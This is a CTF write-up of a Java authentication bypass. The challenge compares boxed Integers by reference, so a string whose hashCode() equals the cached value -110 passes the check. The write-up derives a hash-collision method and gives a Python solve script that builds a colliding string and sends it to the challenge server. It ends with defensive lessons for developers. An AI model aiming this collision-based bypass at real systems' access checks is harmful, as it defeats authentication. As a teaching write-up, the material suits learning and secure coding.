# BushBash cachebrowns — JVM Integer Caching Auth Bypass

**CTF:** BushBash 2026 · **Category:** pwn · **Difficulty:** medium · **Points:** 205 · **Solves:** 139
**Author:** Harold Gao · **Server:** `nc 34.40.133.67 7777` (Java 25)
**Flag:** `bushbash{doNt-Dr1nk-jav4-foR-br3kkie}`

## The bug

```java
static Integer[] PERMITTED_HASHCODES = new Integer[] {
        982114681, ..., -110, ..., 128
};

static boolean auth(Integer inputHash){
    for (Integer permittedHashcode : PERMITTED_HASHCODES) {
        if(permittedHashcode == inputHash){ return true; }   // reference compare!
    }
    return false;
}
```

`==` on two `Integer`s is **reference equality**, not value equality. `input.hashCode()`
returns a primitive `int` that is auto-boxed through `Integer.valueOf()`, which returns a
**cached shared instance** for values in the range **-128..127**. The array literal's
`-110` element is also auto-boxed through `valueOf(-110)` → the *same* cached object.

⇒ Any 16+ char string whose `hashCode()` is `-110` passes `auth()`. All other permitted
values are outside the cache range and are simply unreachable via `==`.

## Building the collision

Java `String.hashCode()`:
```
h = 0; for each char c: h = 31*h + c        (32-bit int arithmetic)
```
For 14-char prefix `P` (hash `H`) + two chars `x`,`y`:
```
full = H*31*31 + x*31 + y  ≡  -110  (mod 2^32)
d = (-110 - H*31*31) mod 2^32
if d < 31*65536:  x = d//31, y = d%31   (both valid char values)
```
Random printable prefixes hit an in-range `d` with p≈1/2000 → found instantly.

Collision: `"7CCCm;'(c*_w=v\u5aff\x1e"` (16 chars, hash -110).

## Solve

```python
import socket, random
TARGET = (-110) & 0xFFFFFFFF
def jhash(s):
    h = 0
    for c in s: h = (h*31 + ord(c)) & 0xFFFFFFFF
    return h
random.seed(1337)
found = None
for _ in range(200000):
    p = ''.join(chr(random.randint(33,126)) for _ in range(14))
    d = (TARGET - jhash(p)*31*31) & 0xFFFFFFFF
    if d < 31*65536:
        x, y = d//31, d%31
        if x < 65536:
            found = p + chr(x) + chr(y)
            assert jhash(found) == TARGET
            break
s = socket.create_connection(("34.40.133.67",7777), 15)
s.recv(4096); s.sendall(found.encode()+b"\n")
print(s.recv(4096).decode())
# -> bushbash{doNt-Dr1nk-jav4-foR-br3kkie}
```

## Takeaways

1. `Integer == Integer` (and `Boolean`, `Character`, Python small-int interning, Ruby
   symbols) — always treat boxed-primitive `==` as reference equality.
2. `Integer.valueOf` cache range is **-128..127**; anything in an allowed-list inside that
   range becomes a free bypass primitive.
3. Java `String.hashCode()` collisions for a *specific* target hash are trivial:
   `d = (target - H*31²) mod 2^32`, last two chars `= d//31, d%31`.
4. "pwn" challenges aren't always memory-corruption — language-runtime quirks count.
